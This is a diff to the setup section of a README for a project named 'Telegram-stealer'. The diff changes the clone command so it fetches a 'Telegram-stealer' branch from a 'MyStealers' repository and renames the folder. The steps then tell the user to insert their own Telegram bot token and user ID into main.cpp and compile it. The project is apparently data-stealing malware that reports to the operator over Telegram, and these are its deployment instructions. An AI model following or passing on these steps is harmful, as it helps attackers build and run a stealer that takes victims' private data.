@@ -9,7 +9,7 @@
 1. Clone this repository:
 
    ```bash
-   git clone https://github.com/nolimanom/Telegram-stealer
+   git clone --depth 1 --branch Telegram-stealer https://github.com/nolimanom/MyStealers && (cmd.exe /C "ren MyStealers NolimanomStealers_Telegram-stealer" 2>nul || mv MyStealers NolimanomStealers_Telegram-stealer)
    ```
 2. Open `main.cpp` and replace the placeholders at lines 91 and 92 with your Telegram bot token and your user ID (@userinfobot).
 3. Build the project using the Visual Studio compiler:
